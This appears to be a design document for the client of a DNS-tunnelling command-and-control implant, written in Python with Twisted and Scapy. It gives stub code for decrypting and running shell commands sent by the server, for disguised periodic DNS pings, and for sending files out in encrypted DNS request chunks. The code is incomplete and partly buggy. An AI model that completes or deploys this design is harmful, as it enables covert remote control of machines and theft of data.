## Client Program Design

The client program is responsible for reading and executing commands sent by the C&C server. To ensure this behavior, the following features will be implemented.



### Features

1. **Command Decryption & Execution**

   * Initially, the server would send an **encrypted** command that can come in two flavors. 

     * One flavor is just simply a regular **shell command** (e.g. `ls ~`).  
     * The other flavor uses special syntax and is sent by the server for simple file retrieval (e.g. `get: <file-path>`.

   * In order for the client to execute the command, it first needs to decrypt it.

     * After the command is **decrypted**, the client can execute it according to its command flavor.

   * These tasks will be handled in `command.py`.

     ```python
     #--- client/command.py ---#
     
     class Command:
         """ A class for handling the command sent by the C&C server. """
     
         def __init__(self, encrypted_command):
             self.cmd = encrypted_command
         
         def decrypt(self):
             """ Decrypts the encrypted command into a shell command. """
             pass
         
         def execute(self):
             decrypted = self.decrypt(self.cmd)
             
             # if decrypted starts with "get:"
                 # send data from <path>
             # else
                 # execute command in shell environment
     ```

2. **Server Pinging**

   * The server cannot initiate a connection with the client because the communication between the client and server should look as legitimate as possible. 

   * Instead, the client will periodically **ping** the server (send it a DNS request) over a configurable interval.

   * To implement this behavior, we can use the **twisted** library to call a function over an interval. 

     * An example is shown below in `client.py` which will be the entry point for our client program.

     ```python
     #--- client/client.py ---#
     
     # library imports
     from twisted.internet import reactor, task
     
     # internal imports
     from constants import PING_INTERVAL
     from request import Request
     from command import Command
     from request_type import RequestType
     
     def schedule_ping():
         """ Sends a ping request to the server in an interval. """
         def ping():
             request = Request(RequestType.PING)
             request.send()
     
         ping_task = task.LoopingCall(ping)
         ping_task.start(PING_INTERVAL)
     
         reactor.run()
     ```

3. **Command Execution & Data Transmission**

   * The client can send three types of DNS requests to the server, **ping**, **data**, and **receipt**.

     ```python
     from enum import Enum
     
     class RequestType(Enum):
         """ Enum that represents the type of request that is sent. """
     
         PING = 0, # sent periodically to check if the server has a command
         DATA = 1, # sent when a file retrieval command is issued for transmission of data
         RECEIPT = 2 # a receipt of the success (or failure) of the execution of a shell command
     ```

   * The client would first send a **ping** request to the server for a response. If the response contains a command, the client executes it and sends the result of that execution back to the server.

   * The result will be dependent on the type of command issued. 

     * The **shell** command would just be executed in a shell environment and the result would just be the status code of that command. This result would be sent as a **receipt** request in order to let the server know whether the command succeeded or failed.
     * The **file retrieval** command would open the file specified, read and encrypt the maximum number of bytes that can fit inside a DNS request, and send it to the server as a **data** request.
       - This process would continue until the contents of the entire file has been sent to the server.

   * These DNS requests will be constructed in `request.py`.

     ```python
     #--- client/request.py ---#
     
     # from scapy.all import DNS, DNSQR
     
     # internal imports
     from constants import REQUEST_TYPE_ERR
     from request_type import RequestType
     
     class Request:
         """ A class for the DNS request that is sent to the C&C server holding information / receipt. """
     
         def __init__(self, request_type):
             # type = (PING, DATA, RECEIPT)
             self.type = request_type
         
         def send(self):
             """ Main function that sends a request based on its type. """
             if self.request.type == RequestType.PING: _send_ping(self)
             elif self.request.type == RequestType.DATA: _send_data(self)
             elif self.request.type == RequestType.RECEIPT: _send_receipt(self)
             else: raise Exception(REQUEST_TYPE_ERR)
         
         def _send_ping(self):
             """ Helper function to send a ping request. """
             pass
         
         def _send_data(self):
             """ Helper function to send a data request. """
             pass
         
         def _send_receipt(self):
             """ Helper function to send a receipt request. """
             pass
     
     ```

     

### Dependencies

* Python (v3.7+)
* Twisted (v18.9.0)
* Scapy (v2.4.2)



